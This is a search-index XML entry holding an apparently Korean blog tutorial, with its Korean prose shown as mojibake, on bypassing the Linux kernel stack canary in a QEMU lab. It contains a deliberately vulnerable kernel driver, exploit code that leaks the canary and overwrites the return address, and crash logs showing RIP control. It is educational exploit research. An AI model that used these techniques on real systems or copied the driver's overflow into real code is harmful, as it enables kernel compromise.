<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>[Research] Linux Kernel Exploit - Bypassing SSP</title>
    <link href="/2021/10/03/linux-kernel-exploit-bypassing-ssp/"/>
    <url>/2021/10/03/linux-kernel-exploit-bypassing-ssp/</url>
    
    <content type="html"><![CDATA[<h2 id="Research-Linux-Kernel-Exploit-Bypassing-SMAP"><a href="#Research-Linux-Kernel-Exploit-Bypassing-SMAP" class="headerlink" title="[Research] Linux Kernel Exploit - Bypassing SMAP"></a>[Research] Linux Kernel Exploit - Bypassing SMAP</h2><p><img src="/img/penguinshot.png"></p><h2 id="ì„œë¡ "><a href="#ì„œë¡ " class="headerlink" title="ì„œë¡ "></a>ì„œë¡ </h2><p>í•´ë‹¹ í¬ìŠ¤íŠ¸ì—ì„œëŠ” Linux Kernel Basic ì‹œë¦¬ì¦ˆì˜ ì •ë³´ë¥¼ ê¸°ë°˜ìœ¼ë¡œ í•˜ì—¬ ë¦¬ëˆ…ìŠ¤ ì»¤ë„ì— ì ìš©ë˜ì–´ ìˆëŠ” ë³´í˜¸ê¸°ë²•(mitigation)ì„ í•˜ë‚˜ì”© ìš°íšŒí•˜ì—¬ ê³µê²©í•˜ëŠ” ê³¼ì •ì„ í¬ìŠ¤íŠ¸í•˜ë ¤ê³  í•œë‹¤. í•´ë‹¹ í¬ìŠ¤íŠ¸ì—ì„œëŠ” SSP ë³´í˜¸ê¸°ë²•ì„ ì£¼ì œë¡œ í•˜ì—¬ í•´ë‹¹ ë³´í˜¸ê¸°ë²•ì´ ì–´ë– í•œ ë³´í˜¸ê¸°ë²•ì¸ì§€ ì´í•´í•˜ê³  ì´ë¥¼ ìš°íšŒí•˜ì—¬ ê³µê²©í•˜ëŠ” ë°©ë²•ì„ ì‘ì„±í•˜ë ¤ê³  í•œë‹¤.</p></br></br><h2 id="SSP"><a href="#SSP" class="headerlink" title="SSP"></a>SSP</h2></br><p><img src="/img/canary.jpg"></p></br><p><b>SSP(Stack Smashing Protector)</b>ì€ Stackì—ì„œì˜ ì§€ì •ëœ ë²„í¼ í¬ê¸° ì´ìƒì˜ ë°ì´í„°ê°€ ì…ë ¥ë˜ì–´ ì‹¤í–‰íë¦„ì´ ë³€ì¡°ë  ê²½ìš° ë²„í¼ì™€ Return Address ì‚¬ì´ì˜ ì„ì˜ì˜ ë‚œìˆ˜ê°’ì„ ì„¤ì •í•´ë‘ì–´ í•¨ìˆ˜ê°€ ì¢…ë£Œëœ í›„ í•´ë‹¹ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•œ ì˜ì—­(Caller)ìœ¼ë¡œ ëŒì•„ê°€ê¸° ì´ì „ì— ì´ë¥¼ í™•ì¸í•˜ëŠ” ë³´í˜¸ê¸°ë²•ì„ ì˜ë¯¸í•œë‹¤.</p></br><p>ë‚˜ì—ê²Œ ìˆì–´ì„œëŠ” ìŠ¤íƒ ì¹´ë‚˜ë¦¬ë¼ëŠ” ì´ë¦„ìœ¼ë¡œ ë”ìš± ìµìˆ™í•˜ë‹¤. ì‚¬ì‹¤ í•´ë‹¹ ê¸°ë²•ì´ ì•„ì´ë””ì–´ëŠ” í•˜ë‚˜ì¸ë° ë³„ëª…(Stack Canary, Stack Cookie, Stack Guardâ€¦)ì€ ìš´ì˜ì²´ì œì— ë”°ë¼ì„œë„ ë‹¤ë¥´ê²Œ ë¶ˆë¦¬ì–´ì§€ê³  í•˜ë‹ˆê¹Œ ì´ë¦„ì´ ì¤‘ìš”í•œ ê²ƒ ë³´ë‹¤ ì•„ì´ë””ì–´ì— ì§‘ì¤‘í•˜ëŠ” ê²ƒì´ ì¢‹ì„ ê²ƒìœ¼ë¡œ íŒë‹¨ëœë‹¤. ì´ëŸ¬í•œ ì¸ì‚¬ì´íŠ¸ë¥¼ ë‚˜ë§Œì˜ ê²½í—˜ìœ¼ë¡œ ì œì‹œí•˜ê¸° ìœ„í•´ì„œ ì¬ë°ŒëŠ”(?) ë¶€ê°€ì„¤ëª…ì„ ë§ë¶™íˆê² ë‹¤.</p></br><p>ìƒë‹¨ì— ì œì‹œëœ ê·¸ë¦¼ì˜ ê²½ìš°ëŠ” ë²„ë“œë°•ìŠ¤(2018)ë¼ëŠ” ì˜í™”ì´ë‹¤. ì‚¬ëŒì´ ëˆˆìœ¼ë¡œ í™•ì¸í•  ìˆ˜ ì—†ëŠ” ê´´ë¬¼ì´ ë‚˜ì˜¤ëŠ” ì˜í™”ì¸ë° ìƒˆë¥¼ ë°ë¦¬ê³  ë‹¤ë‹ˆë©´ ìƒˆëŠ” ì´ëŸ¬í•œ ê´´ë¬¼ì„ ê°ì§€í•˜ëŠ” ì—­í• ì„ í•œë‹¤. ê´‘ì‚°ì—ì„œë„ ìœ ë…ê°€ìŠ¤ê°€ ë°œìƒí•˜ë©´ ì˜ˆì „ì—ëŠ” ì¹´ë‚˜ë¦¬ì•„ë¥¼ ì´ìš©í•´ì„œ ìœ„í—˜ì„±ì„ ê°ì§€í•˜ê³  ëŒ€í”¼í•˜ì˜€ë‹¤ê³  í•œë‹¤. ê·¸ë˜ì„œ ì†Œí”„íŠ¸ì›¨ì–´ ì…ì¥ì—ì„œëŠ” ê³µê²©ìƒí™©ì— ëŒ€í•œ ê°ì§€ë¡œ ìŠ¤íƒì— ìˆëŠ” ì¹´ë‚˜ë¦¬ì•„ë¼ê³  ë¶ˆë¦°ë‹¤ê³  ì´ë¦„ì„ ë“¤ì—ˆë˜ ê²ƒ ê°™ë‹¤. ì œì¼ í¥ë¯¸ë¡œìš´ ì´ë¦„ìœ¼ë¡œ ì§€ì •ë˜ì—ˆìœ¼ë‹ˆê¹Œ ì•ìœ¼ë¡œëŠ” ìŠ¤íƒ ì¹´ë‚˜ë¦¬ë¼ê³  ë¶€ë¥´ê² ë‹¤.</p></br><p>ì‹¤ì œ êµ¬í˜„ì›ë¦¬ëŠ” ë§¤ìš° ì§ê´€ì ì´ë©° ê°„ë‹¨í•˜ë‹¤. ë²„í¼ì™€ Return Address ì‚¬ì´ì˜ ì„ì˜ì˜ ë‚œìˆ˜ê°’ì„ ì„¤ì •í•´ë‘ì–´ ì´ë¥¼ í™•ì¸í•˜ëŠ” ì›ë¦¬ì´ë‹¤. ê·¸ë ‡ë‹¤ë©´ ìŠ¤íƒ ê¸°ë°˜ì—ì„œ ì˜¤ë²„ í”Œë¡œìš°ë¥¼ ë°œìƒì‹œí‚¤ê¸° ì´ì „ <u>ìŠ¤íƒ ì¹´ë‚˜ë¦¬ì˜ ê°’ì„ ê³µê²©ìê°€ ì•Œ ìˆ˜ ìˆëŠ” í™˜ê²½</u>ì´ë¼ê³  í•˜ë©´ ì´ë¥¼ ê³ ë ¤í•˜ì—¬ ì˜¤ë²„ í”Œë¡œìš°ë¥¼ ë°œìƒì‹œí‚¤ë©´ ë˜ëŠ” ê²ƒì´ë‹¤.</p><p></br></br></p><h2 id="í™˜ê²½ë¶„ì„"><a href="#í™˜ê²½ë¶„ì„" class="headerlink" title="í™˜ê²½ë¶„ì„"></a>í™˜ê²½ë¶„ì„</h2><h3 id="start-sh"><a href="#start-sh" class="headerlink" title="start.sh"></a>start.sh</h3><pre><code>qemu-system-x86_64 \-m 512M \-kernel ./bzImage \-initrd  ./rootfs.cpio \-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet nokaslr&quot; \-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \-nographic  \-cpu qemu64,smep,smap \</code></pre><p>ë¶€íŒ… ìŠ¤í¬ë¦½íŠ¸ì˜ ê²½ìš° ë‹¤ìŒê³¼ ê°™ì€ í˜•íƒœë¡œ ì‘ì„±ë˜ì–´ ìˆë‹¤. ì ìš©ëœ ë³´í˜¸ê¸°ë²•ì„ í™•ì¸í•´ë³´ë©´ KASLRì˜ ê²½ìš°ëŠ” ë¹„í™œì„±í™” í•´ë‘ì—ˆìœ¼ë©° SMEPê³¼ SMAPì˜ ê²½ìš°ëŠ” í™œì„±í™” ë˜ì–´ ìˆë‹¤. </p><p>í™˜ê²½ë¶„ì„ì—ì„œëŠ” ê¸°ì¬í•  ìˆ˜ ì—†ì§€ë§Œ ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ë¥¼ ì»´íŒŒì¼ í•  ê²½ìš° ê¸°ë³¸ì ìœ¼ë¡œ SSPê°€ í™œì„±í™”ë˜ì–´ ì»´íŒŒì¼ë˜ë¯€ë¡œ ëª¨ë“  í•¨ìˆ˜ ì—í•„ë¡œê·¸ì—ì„œ Stack Canaryê°€ ì˜¤ì—¼ë˜ì—ˆëŠ” ì§€ í™•ì¸í•˜ëŠ” ë¡œì§ì´ ìë™ì ìœ¼ë¡œ ì¶”ê°€ëœë‹¤.</p><p></br></br></p><h2 id="ë°”ì´ë„ˆë¦¬-ë¶„ì„"><a href="#ë°”ì´ë„ˆë¦¬-ë¶„ì„" class="headerlink" title="ë°”ì´ë„ˆë¦¬ ë¶„ì„"></a>ë°”ì´ë„ˆë¦¬ ë¶„ì„</h2><h3 id="ë””ë°”ì´ìŠ¤-ë“œë¼ì´ë²„-ì†ŒìŠ¤ì½”ë“œ"><a href="#ë””ë°”ì´ìŠ¤-ë“œë¼ì´ë²„-ì†ŒìŠ¤ì½”ë“œ" class="headerlink" title="ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ ì†ŒìŠ¤ì½”ë“œ"></a>ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ ì†ŒìŠ¤ì½”ë“œ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;linux/input.h&gt;<br>#include &lt;linux/module.h&gt;<br>#include &lt;linux/init.h&gt;<br>#include &lt;linux/kernel.h&gt;<br>#include &lt;linux/miscdevice.h&gt;<br>#include &lt;linux/device.h&gt;<br>#include &lt;linux/slab.h&gt;<br>#include &lt;linux/uaccess.h&gt;<br>#include &lt;linux/string.h&gt;<br><br>MODULE_LICENSE(&quot;Dual BSD/GPL&quot;);<br>MODULE_AUTHOR(&quot;SAMPLE&quot;);<br><br>static ssize_t test_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos);<br>static ssize_t test_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos);<br><br>struct file_operations test_fops = &#123;<br>    .read   = test_read,<br>    .write  = test_write,<br>&#125;;<br><br>static struct miscdevice test_driver = &#123;<br>    .minor = MISC_DYNAMIC_MINOR,<br>    .name = &quot;test&quot;,<br>    .fops = &amp;test_fops,<br>&#125;;<br><br>static ssize_t test_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos) &#123;<br>    char arr[8] = &#123; [0 ... 7] = 0 &#125;;<br>    char *ptr;<br><br>    ptr = (char *)kzalloc(count, GFP_KERNEL);<br>    memcpy(ptr, arr, count);<br><br>    copy_to_user(buf, ptr, count);<br><br>    return 0;<br>&#125;<br><br><br>static ssize_t test_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos) &#123;<br>    char arr[8] = &#123; [0 ... 7] = 0 &#125;;<br>    char *ptr;<br><br>    ptr = (char *)kmalloc(count, GFP_KERNEL);<br><br>    copy_from_user(ptr, buf, count);<br>    memcpy(arr, ptr, count);<br>    <br>    printk(&quot;arr : %x&quot;, arr[count-1]); <br><br>    return 0;<br>&#125;<br><br><br>static int test_init(void) &#123;<br>    int result;<br><br>    result = misc_register(&amp;test_driver);<br><br>    return 0;<br>&#125;<br><br>static void test_exit(void) &#123;<br>    misc_deregister(&amp;test_driver);<br>&#125;<br><br>module_init(test_init);<br>module_exit(test_exit);<br></code></pre></td></tr></table></figure><p>í•´ë‹¹ ì†ŒìŠ¤ì½”ë“œì˜ ê²½ìš° ê³µê²© ë²¡í„°(attack vector)ê°€ ë  ìˆ˜ ìˆëŠ” ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ íŒŒì¼ì˜ ì†ŒìŠ¤ì½”ë“œì´ë‹¤. ì†ŒìŠ¤ì½”ë“œë¥¼ í™•ì¸í•´ë³¼ ê²½ìš° file_operations êµ¬ì¡°ì²´ ë‚´ë¶€ì—ì„œ read, write ì‹œìŠ¤í…œ ì½œì— ëŒ€ì‘í•˜ëŠ” ë™ì‘ë“¤ì„ ì •ì˜í•˜ê³  ìˆë‹¤.</p><p>ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ íŒŒì¼ì„ í† ëŒ€ë¡œ read ì‹œìŠ¤í…œ ì½œì„ í˜¸ì¶œí•˜ê²Œ ë  ê²½ìš° test_read() í•¨ìˆ˜ê°€ ì‹¤í–‰ëœë‹¤. í•´ë‹¹ í•¨ìˆ˜ê°€ ì‹¤í–‰ë  ê²½ìš° line33ì— ì˜í•˜ì—¬ ì»¤ë„ì—ì„œ ë©”ëª¨ë¦¬ë¥¼ ë™ì í• ë‹¹í•œ í›„ ì»¤ë„ì˜ ìŠ¤íƒ ë²„í¼ì— ìˆëŠ” ë°ì´í„°ë¥¼ ë³µì‚¬í•´ì˜¤ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. í•´ë‹¹ ë¡œì§ì—ì„œ ê°’ì„ ë³µì‚¬í•˜ëŠ” countê°€ ê³µê²©ìê°€ ì„ì˜ë¡œ ë³€ê²½í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì— ì»¤ë„ ìŠ¤íƒ ë²„í¼ì— ìˆëŠ” ê°’ë“¤ì„ leakí•  ìˆ˜ ìˆë‹¤. í•´ë‹¹ ì‹œìŠ¤í…œ í˜¸ì¶œì„ í†µí•´ì„œ stack canaryë¥¼ ì•Œ ìˆ˜ ìˆë‹¤. </p><p>ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ íŒŒì¼ì„ í† ëŒ€ë¡œ write ì‹œìŠ¤í…œ ì½œì„ í˜¸ì¶œí•˜ê²Œ ë  ê²½ìš° test_wrtie() í•¨ìˆ˜ê°€ ì‹¤í–‰ëœë‹¤. í•´ë‹¹ í•¨ìˆ˜ê°€ ì‹¤í–‰ë  ê²½ìš° line48ì— ì˜í•˜ì—¬ ìœ ì €ì˜ì—­ì˜ ë©”ëª¨ë¦¬ë¥¼ ì»¤ë„ì˜ ìŠ¤íƒë²„í¼ì— ë³µì‚¬í•˜ê¸°ì— ì´ë¥¼ í†µí•œ ë©”ëª¨ë¦¬ ì˜¤ì—¼(memory corruption)ì´ ê°€ëŠ¥í•˜ë‹¤. ê²°ê³¼ì ìœ¼ë¡œ return addressë¥¼ ì¡°ì‘í•  ìˆ˜ ìˆìŒìœ¼ë¡œ ì‹¤í–‰ íë¦„ì˜ ë³€ì¡°ê°€ ê°€ëŠ¥í•  ê²ƒìœ¼ë¡œ ë³´ì—¬ì§„ë‹¤.</p><p></br></br></p><h2 id="ì·¨ì•½ì -ë¶„ì„"><a href="#ì·¨ì•½ì -ë¶„ì„" class="headerlink" title="ì·¨ì•½ì  ë¶„ì„"></a>ì·¨ì•½ì  ë¶„ì„</h2><p><b>ë°”ì´ë„ˆë¦¬ ë¶„ì„</b>ì—ì„œ ì‚¬ìš©ìì˜ ì…ë ¥ìœ¼ë¡œ ë¶€í„° ì»¤ë„ ìŠ¤íƒì˜ ì •ë³´ë¥¼ ì•Œ ìˆ˜ ìˆìœ¼ë©° ì‹¤í–‰íë¦„ì„ ë³€ì¡°í•  ê°€ëŠ¥ì„±ì´ ìˆìŒì„ í™•ì¸í•˜ì˜€ë‹¤. í•´ë‹¹ ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ë¥¼ í† ëŒ€ë¡œ write ì‹œìŠ¤í…œ ì½œì´ í˜¸ì¶œë˜ê²Œ ë  ê²½ìš° ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ì˜ ê²½ìš° ì‚¬ìš©ìì˜ ì…ë ¥(untrusted input)ì´ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ë¥¼ ë°œìƒì‹œí‚¤ê¸° ë•Œë¬¸ì´ë‹¤. ì˜ˆìƒí•œ ê²°ê³¼ê°€ ë§ëŠ”ê°€ì— ëŒ€í•´ì„œ í™•ì¸í•´ë³¼ í•„ìš”ê°€ ìˆë‹¤.</p></br><h3 id="ê³µê²©-ì½”ë“œ-1"><a href="#ê³µê²©-ì½”ë“œ-1" class="headerlink" title="ê³µê²© ì½”ë“œ(1)"></a>ê³µê²© ì½”ë“œ(1)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/stat.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;stdint.h&gt;<br><br>int main() &#123;<br>    int fd;<br>    size_t *canary[6] = &#123;0, &#125;;<br><br><br>    fd = open(&quot;/dev/test&quot;, O_RDWR);<br><br>    read(fd, canary, sizeof(canary));<br>    <br>    printf(&quot;canary[0] = %lx\n&quot;, canary[0]);<br>    printf(&quot;canary[1] = %lx\n&quot;, canary[1]);<br>    printf(&quot;canary[2] = %lx\n&quot;, canary[2]);<br>    printf(&quot;canary[3] = %lx\n&quot;, canary[3]);<br>    printf(&quot;canary[4] = %lx\n&quot;, canary[4]);<br>    printf(&quot;canary[5] = %lx\n&quot;, canary[5]);<br><br><br>    close(fd);<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure><p>ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ë¥¼ ì œì–´í•˜ëŠ” ì½”ë“œë¥¼ ì‘ì„±í•˜ì˜€ë‹¤. ë””ë°”ì´ìŠ¤ì— í•´ë‹¹í•˜ëŠ” íŒŒì¼ì„ í†µí•´ read ì‹œìŠ¤í…œ ì½œì„ í˜¸ì¶œí•¨ì„ í†µí•´ì„œ ì»¤ë„ ìŠ¤íƒì˜ ì •ë³´ë¥¼ ìœ ì¶œ(leak)í•´ë³´ë ¤ê³  í•œë‹¤. ì´ 48ë°”ì´íŠ¸ í¬ê¸°ì˜ ë°ì´í„°ë¥¼ ì¶œë ¥í•´ë´„ìœ¼ë¡œ ì–´ë– í•œ ë¶€ë¶„ì´ ì¹´ë‚˜ë¦¬ë¡œ ì˜ˆìƒë  ì§€ ì¶œë ¥í•  ìˆ˜ ìˆë‹¤. ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ì˜ test_read() í•¨ìˆ˜ ë‚´ë¶€ì˜ ë²„í¼ì˜ í¬ê¸°ëŠ” 8ë°”ì´íŠ¸ì´ë¯€ë¡œ ì¶©ë¶„í•œ í¬ê¸°ì˜ ì •ë³´ë¥¼ ì¶œë ¥í•œë‹¤ëŠ” ê²ƒì„ ê°€ì •í•´ì„œ ì§„í–‰í•´ë³´ê² ë‹¤.</p></br><h3 id="ê³µê²©-ê²°ê³¼-1"><a href="#ê³µê²©-ê²°ê³¼-1" class="headerlink" title="ê³µê²© ê²°ê³¼(1)"></a>ê³µê²© ê²°ê³¼(1)</h3><pre><code>qemu-system-x86_64: warning: TCG doesn&#39;t support requested feature: CPUID.01H:ECX.vmx [bit 5]/ $ ./leak canary[0] = 0canary[1] = 7f78bbec01f33a00canary[2] = 30canary[3] = 1canary[4] = ffffffff811e311bcanary[5] = ffff88801d9ec900/ $ ./leak canary[0] = 0canary[1] = 875b1e91019ab700canary[2] = 30canary[3] = 1canary[4] = ffffffff811e311bcanary[5] = ffff88801d9eca00/ $ ./leak canary[0] = 0canary[1] = c24444f6245e5700canary[2] = 30canary[3] = 1canary[4] = ffffffff811e311bcanary[5] = ffff88801d9ecb00/ $ ./leak canary[0] = 0canary[1] = 92fb1f83c3973e00canary[2] = 30canary[3] = 1canary[4] = ffffffff811e311bcanary[5] = ffff88801d9ec900/ $ ./leak canary[0] = 0canary[1] = 2ed61794e0235300canary[2] = 30canary[3] = 1canary[4] = ffffffff811e311bcanary[5] = ffff88801d9eca00</code></pre><p>ì‘ì„±í•˜ì˜€ë˜ ì½”ë“œë¥¼ í† ëŒ€ë¡œ ì»¤ë„ ìŠ¤íƒ ë²„í¼ì— ìˆëŠ” ë°ì´í„°ë¥¼ ìœ ì¶œ(leak)í•´ë³¸ ê²°ê³¼ ë‹¤ìŒê³¼ ê°™ì€ í˜•íƒœì´ë‹¤. ì‚¬ì‹¤ ë””ë²„ê¹…ì„ ì§„í–‰í•˜ë©´ ì–´ë– í•œ ìœ„ì¹˜ê°€ ìŠ¤íƒ ì¹´ë‚˜ë¦¬ì— í•´ë‹¹í•˜ëŠ” ê°’ì¸ì§€ ëª…í™•íˆ ì•Œ ìˆ˜ ìˆì§€ë§Œ í˜„ì¬ì˜ ê²°ê³¼ë¥¼ ë³´ì•˜ì„ ë•Œ ì»¤ë„ ë²„í¼ì˜ ì‚¬ì´ì¦ˆëŠ” 8ì´ë©° ì´í›„ì˜ ê°’ë¶€í„° ê°€ì¥ ê·œì¹™ì„±ì„ ë„ì§€ ì•ŠëŠ” ìŠ¤íƒ ì¹´ë‚˜ë¦¬ë¼ê³  íŒë‹¨ë˜ëŠ” ê°’ì€ canary[1]ì— í•´ë‹¹í•˜ëŠ” ê°’ìœ¼ë¡œ íŒë‹¨ëœë‹¤. </p><p>ë˜í•œ ìœ„ì—ì„œëŠ” ì œì‹œí•˜ì§€ ì•Šì•˜ì§€ë§Œ ì´ì „ í¬ìŠ¤íŠ¸ì—ì„œ ì œì‹œí•˜ì˜€ë˜ ë°©ë²•ê³¼ ë™ì¼í•˜ê²Œ return addressë¥¼ í™•ì¸í•´ë³¸ ê²°ê³¼ ë²„í¼ì—ì„œ 40ë°”ì´íŠ¸ ë–¨ì–´ì§„ ê³³ì´ return addressë¡œ íŒë‹¨ëœë‹¤.</p></br><h3 id="ê³µê²©-ì½”ë“œ-2"><a href="#ê³µê²©-ì½”ë“œ-2" class="headerlink" title="ê³µê²© ì½”ë“œ(2)"></a>ê³µê²© ì½”ë“œ(2)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/stat.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;stdint.h&gt;<br><br>int main() &#123;<br>    int fd;<br>    size_t *canary[6] = &#123;0, &#125;;<br>    size_t payload[20] = &#123;0, &#125;;<br><br><br>    fd = open(&quot;/dev/test&quot;, O_RDWR);<br><br><br>    // STEP1. Leak Stack Canary<br>    read(fd, canary, sizeof(canary));<br>    <br>    printf(&quot;canary[0] = %lx\n&quot;, canary[0]);<br>    printf(&quot;canary[1] = %lx\n&quot;, canary[1]);<br>    printf(&quot;canary[2] = %lx\n&quot;, canary[2]);<br>    printf(&quot;canary[3] = %lx\n&quot;, canary[3]);<br>    printf(&quot;canary[4] = %lx\n&quot;, canary[4]);<br>    printf(&quot;canary[5] = %lx\n&quot;, canary[5]);<br><br><br>    // STEP2. Corrupt Stack Memory<br>    payload[0] = canary[1];<br>    payload[1] = canary[1];<br>    payload[2] = canary[1];<br>    payload[3] = canary[1];<br>    payload[4] = canary[1];<br>    payload[5] = 0x4343434343434343;<br><br>    write(fd, payload, sizeof(payload));<br><br><br>    close(fd);<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ê³µê²©-ê²°ê³¼-2"><a href="#ê³µê²©-ê²°ê³¼-2" class="headerlink" title="ê³µê²© ê²°ê³¼(2)"></a>ê³µê²© ê²°ê³¼(2)</h3><pre><code>qemu-system-x86_64: warning: TCG doesn&#39;t support requested feature: CPUID.01H:ECX.vmx [bit 5]/ $ ./crash canary[0] = 0canary[1] = 77aa91d07abac300canary[2] = 30canary[3] = 1canary[4] = ffffffff811e311bcanary[5] = ffff88801d9ec300[    3.942545] arr : 0[    3.942953] general protection fault: 0000 [#1] SMP NOPTI[    3.944977] CPU: 0 PID: 70 Comm: crash Tainted: G           O      5.8.5 #1[    3.946180] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014[    3.948119] RIP: 0010:0x4343434343434343[    3.949110] Code: Bad RIP value.[    3.955544] RSP: 0018:ffffc9000019fed8 EFLAGS: 00000286[    3.955840] RAX: 0000000000000000 RBX: 77aa91d07abac300 RCX: 0000000000000000[    3.956295] RDX: 0000000000000000 RSI: ffffffff82b2bba0 RDI: ffffffff82b2bfa0[    3.956783] RBP: 77aa91d07abac300 R08: 0000000030203a20 R09: 0000000000000007[    3.957227] R10: 0000000000000046 R11: ffffffff82b2bba7 R12: 77aa91d07abac300[    3.957691] R13: 00000000000000a0 R14: ffffc9000019ff10 R15: 00007ffdbbfb26a0[    3.958258] FS:  000000000168b880(0000) GS:ffff88801f000000(0000) knlGS:0000000000000000[    3.958848] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033[    3.960591] CR2: 000000000168db28 CR3: 000000001da40000 CR4: 00000000003006f0[    3.961172] Call Trace:[    3.962152]  ? entry_SYSCALL_64_after_hwframe+0x44/0xa9[    3.964479] Modules linked in: test(O)[    3.965730] ---[ end trace e9e73822d90c8f9d ]---[    3.967058] RIP: 0010:0x4343434343434343[    3.967454] Code: Bad RIP value.[    3.967779] RSP: 0018:ffffc9000019fed8 EFLAGS: 00000286[    3.968107] RAX: 0000000000000000 RBX: 77aa91d07abac300 RCX: 0000000000000000[    3.968623] RDX: 0000000000000000 RSI: ffffffff82b2bba0 RDI: ffffffff82b2bfa0[    3.969116] RBP: 77aa91d07abac300 R08: 0000000030203a20 R09: 0000000000000007[    3.969657] R10: 0000000000000046 R11: ffffffff82b2bba7 R12: 77aa91d07abac300[    3.970123] R13: 00000000000000a0 R14: ffffc9000019ff10 R15: 00007ffdbbfb26a0[    3.970625] FS:  000000000168b880(0000) GS:ffff88801f000000(0000) knlGS:0000000000000000[    3.971228] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033[    3.971760] CR2: 000000000168db28 CR3: 000000001da40000 CR4: 00000000003006f0[    3.972372] Kernel panic - not syncing: Fatal exception[    3.973145] Kernel Offset: disabled[    3.973878] Rebooting in 1 seconds..qemu-system-x86_64: Trying to execute code outside RAM or ROM at 0x0000000081400220This usually means one of the following happened:(1) You told QEMU to execute a kernel for the wrong machine type, and it crashed on startup (eg trying to run a raspberry pi kernel on a versatilepb QEMU machine)(2) You didn&#39;t give QEMU a kernel or BIOS 